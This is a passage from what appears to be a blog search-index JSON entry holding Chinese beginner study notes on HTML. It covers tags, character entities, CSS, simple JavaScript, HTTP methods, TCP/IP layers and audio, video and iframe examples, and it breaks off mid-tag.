[{"title":"HTML基础","url":"/2022/08/17/HTML%E5%9F%BA%E7%A1%80/","content":"<h1 id=\"index-html\"><a href=\"#index-html\" class=\"headerlink\" title=\"index.html\"></a>index.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">超文本标记（标签）语言</span></span><br><span class=\"line\"><span class=\"comment\">HTML - Hyper-text Markup Language</span></span><br><span class=\"line\"><span class=\"comment\">1. 标签 - content（内容）- 承载内容</span></span><br><span class=\"line\"><span class=\"comment\">2. 层叠样式表 - display（显示）- 渲染页面</span></span><br><span class=\"line\"><span class=\"comment\">3. JavaScript - behavior（行为）- 交互式行为</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">HTML 5</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">文本标签：</span></span><br><span class=\"line\"><span class=\"comment\">h1~h6 - 标题 - heading</span></span><br><span class=\"line\"><span class=\"comment\">hr - 水平标尺 - horizontal ruler</span></span><br><span class=\"line\"><span class=\"comment\">p - 段落 - paragraph</span></span><br><span class=\"line\"><span class=\"comment\">sub 上标 /sup 下标</span></span><br><span class=\"line\"><span class=\"comment\">em 斜体/ strong 粗体</span></span><br><span class=\"line\"><span class=\"comment\">del 删除线/ins 下划线</span></span><br><span class=\"line\"><span class=\"comment\">br - break ruler</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">列表标签：</span></span><br><span class=\"line\"><span class=\"comment\">有序列表 ol - ordered list</span></span><br><span class=\"line\"><span class=\"comment\">无序列表 ul - unordered list</span></span><br><span class=\"line\"><span class=\"comment\">li - list item</span></span><br><span class=\"line\"><span class=\"comment\">定义列表 dl - definition list</span></span><br><span class=\"line\"><span class=\"comment\">dt - definition title</span></span><br><span class=\"line\"><span class=\"comment\">dd - definition description</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">字符实体/实体替换符</span></span><br><span class=\"line\"><span class=\"comment\">&amp;nbsp; - 空格</span></span><br><span class=\"line\"><span class=\"comment\">&amp;lt; &amp;gt; - 尖括号</span></span><br><span class=\"line\"><span class=\"comment\">&amp;copy; &amp;reg; &amp;trade;</span></span><br><span class=\"line\"><span class=\"comment\">菜鸟教程：https://www.runoob.com/html/html-entities.html</span></span><br><span class=\"line\"><span class=\"comment\">https://www.runoob.com/tags/html-reference.html</span></span><br><span class=\"line\"><span class=\"comment\">MDN web DOC: https://developer.mozilla.org/zh-CN/</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">form - 表单</span></span><br><span class=\"line\"><span class=\"comment\">\tinput - 表单控件</span></span><br><span class=\"line\"><span class=\"comment\">audio - 音频</span></span><br><span class=\"line\"><span class=\"comment\">video - 视频</span></span><br><span class=\"line\"><span class=\"comment\">div 容器，一个逻辑区域，如浮动广告</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">js调试：F12&gt;sources&gt;点击行号打断点&gt;点击单步执行、单步跳过逐行分析</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>技术专栏<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- css - cascading style sheet 层叠样式表--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">h1</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">color</span>: red;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">font-size</span>: <span class=\"number\">2cm</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">font-family</span>: <span class=\"string\">&quot;宋体&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">p</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">font-size</span>: <span class=\"number\">1cm</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">p</span><span class=\"selector-pseudo\">:first</span>-letter &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">font-size</span>: <span class=\"number\">1.5cm</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">color</span>: blue;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-class\">.a</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">color</span>: green;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-class\">.b</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">color</span>: purple;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">a</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">color</span>: red;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">text-decoration</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">color</span>: green;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--3.功能链接--&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--http://shang.qq.com--&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--查看你自己的QQ资料，在右下角有个“生成在线状态”点进去，在那个页面就有代码生成功能，选择好之后直接复制即可--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">target</span>=<span class=\"string\">blank</span> <span class=\"attr\">href</span>=<span class=\"string\">http://wpa.qq.com/msgrd?V</span>=<span class=\"string\">1&amp;Uin</span>=<span class=\"string\">11223344&amp;Site</span>=<span class=\"string\">这个地方填写QQ称呼&amp;Menu</span>=<span class=\"string\">yes</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">border</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">SRC</span>=<span class=\"string\">http://wpa.qq.com/pa?p</span>=<span class=\"string\">1:11223344:1</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;点击这里给我发消息&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--2.锚点链接--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;top&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;../Linux/Mariadb_Mysql命令行常用命令_weixin_30708329的博客-CSDN博客.html#foo&quot;</span>&gt;</span>查命令<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span><span class=\"symbol\">&amp;lt;</span>jackfrued<span class=\"symbol\">&amp;gt;</span>博客 - H<span class=\"tag\">&lt;<span class=\"name\">sub</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">sub</span>&gt;</span>0<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>喜欢吃的水果<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ol</span>&gt;</span> <span class=\"comment\">&lt;!-- 有序列表 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>香蕉<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>橘子<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>火龙果<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h3</span>&gt;</span>喜欢的网站<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span> <span class=\"comment\">&lt;!-- 无序列表 --&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!---anchor--&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--1.页面链接--&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--2.锚点链接--&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--3.功能链接--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;https://www.baidu.com&quot;</span> <span class=\"attr\">target</span>=<span class=\"string\">&quot;_blank&quot;</span>&gt;</span>百度<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;https://jd.com&quot;</span> <span class=\"attr\">target</span>=<span class=\"string\">&quot;_self&quot;</span>&gt;</span>京东<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--列表嵌套--&gt;</span></span><br><span class=\"line\">        视频网站</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;https://youku.com&quot;</span> <span class=\"attr\">target</span>=<span class=\"string\">&quot;_blank&quot;</span>&gt;</span>优酷<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;../Linux/Mariadb_Mysql命令行常用命令_weixin_30708329的博客-CSDN博客.html&quot;</span> <span class=\"attr\">target</span>=<span class=\"string\">&quot;_blank&quot;</span>&gt;</span>爱奇艺<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>腾讯视频<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dl</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--img图片标签--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dt</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;image/ingame.png&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">dt</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dd</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dl</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">dt</span>&gt;</span>面向对象的编程语言<span class=\"tag\">&lt;/<span class=\"name\">dt</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">dd</span>&gt;</span>基本概念：类、对象<span class=\"tag\">&lt;/<span class=\"name\">dd</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">dd</span>&gt;</span>三大支柱：封装、继承、多态<span class=\"tag\">&lt;/<span class=\"name\">dd</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">dl</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dd</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dd</span>&gt;</span>动态弱类型语言，需要Python解释器才能执行<span class=\"tag\">&lt;/<span class=\"name\">dd</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dl</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span> <span class=\"comment\">&lt;!--换行标签--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;a&quot;</span>&gt;</span>七<span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span>八<span class=\"tag\">&lt;<span class=\"name\">del</span>&gt;</span>颗<span class=\"symbol\">&amp;trade;</span>星<span class=\"tag\">&lt;<span class=\"name\">strong</span>&gt;</span>天<span class=\"tag\">&lt;/<span class=\"name\">strong</span>&gt;</span>外<span class=\"tag\">&lt;/<span class=\"name\">del</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">sup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">sup</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span>&gt;</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;b&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">ins</span>&gt;</span>两三<span class=\"tag\">&lt;/<span class=\"name\">ins</span>&gt;</span>点雨<span class=\"tag\">&lt;<span class=\"name\">em</span>&gt;</span>山<span class=\"tag\">&lt;/<span class=\"name\">em</span>&gt;</span>前<span class=\"symbol\">&amp;copy;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span> <span class=\"comment\">&lt;!--段落标签--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;showWriter()&quot;</span>&gt;</span>确定<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;shutdown()&quot;</span>&gt;</span>关闭<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--2.锚点链接--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#top&quot;</span>&gt;</span>回顶部<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--3.功能链接--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;mailto:1174185292@qq.com&quot;</span>&gt;</span>联系站长<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--2.锚点链接--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;bottom&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"comment\">// 驼峰命名法 - Camel Notation</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">showWriter</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">window</span>.<span class=\"title function_\">alert</span>(<span class=\"string\">&#x27;作者：Unknow&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">shutdown</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">window</span>.<span class=\"title function_\">confirm</span>(<span class=\"string\">&#x27;确定要关闭吗？&#x27;</span>)) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">window</span>.<span class=\"title function_\">close</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"notes-txt\"><a href=\"#notes-txt\" class=\"headerlink\" title=\"notes.txt\"></a>notes.txt</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Internet - TCP/IP模型 - 协议族</span><br><span class=\"line\"></span><br><span class=\"line\">HTML - Hyper-Text Markup Language</span><br><span class=\"line\">HTTP - Hyper-Text Transfer Protocol</span><br><span class=\"line\"></span><br><span class=\"line\">- get - 从服务器获取资源（网页、图片、音视频）</span><br><span class=\"line\">- post - 提交数据给服务器</span><br><span class=\"line\">- delete</span><br><span class=\"line\">- put</span><br><span class=\"line\">- patch</span><br><span class=\"line\"></span><br><span class=\"line\">应用层 - HTTP / SMTP / POP3 / FTP / SSH / ICQ / QQ</span><br><span class=\"line\">传输层 - TCP/UDP - 端到端传输</span><br><span class=\"line\">IP层（网络层）- 寻址和路由</span><br><span class=\"line\">网络接口层 - 接入网络（分帧、校验）</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"TCP-IP模型-txt\"><a href=\"#TCP-IP模型-txt\" class=\"headerlink\" title=\"TCP+IP模型.txt\"></a>TCP+IP模型.txt</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Internet - TCP/IP模型 - 协议族</span><br><span class=\"line\"></span><br><span class=\"line\">HTML - Hyper-text Markup Language</span><br><span class=\"line\">HTTP - Hyper-text Transfer Protocol</span><br><span class=\"line\"></span><br><span class=\"line\">-get- 从服务器获取资源（网页、图片、音视频）</span><br><span class=\"line\">-post- 提交数据给服务器</span><br><span class=\"line\">-delete</span><br><span class=\"line\">-put</span><br><span class=\"line\">-patch</span><br><span class=\"line\"></span><br><span class=\"line\">应用层 - HTTP / SMTP / POP3 / FTP / SSH / ICQ / QQ</span><br><span class=\"line\">传输层 - TCP/UDP - 端到端传输</span><br><span class=\"line\">IP层（网络层）- 寻址和路由</span><br><span class=\"line\">网络接口层 - 接入网络（分帧、校验）</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"音视频-html\"><a href=\"#音视频-html\" class=\"headerlink\" title=\"音视频.html\"></a>音视频.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">audio</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../audio/Angel.mp3&quot;</span> <span class=\"attr\">autoplay</span> <span class=\"attr\">controls</span> <span class=\"attr\">loop</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">&lt;!--&lt;source src=&quot;audio/Angel.mp3&quot;&gt;--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">audio</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">video</span> <span class=\"attr\">controls</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">source</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../video/VID_20180930_161449.mp4&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">source</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">video</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"框架-html\"><a href=\"#框架-html\" class=\"headerlink\" title=\"框架.html\"></a>框架.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--行级标签（元素） / 块级标签（元素）--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--h1-h6 / p / div / ul / ol / dl / table / form / hr 块级--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--a / img / iframe / button / span / input 行级--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--internal frame（内部窗口）--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;images/446213.jpg&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;images/500e42eeab120.jpg&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://map.baidu.com&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">frameborder</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://www.runoob.com/html/html-iframes.html&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">frameborder</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span>确定<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span>取消<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>百度<span class=\"tag\">&lt;/<span 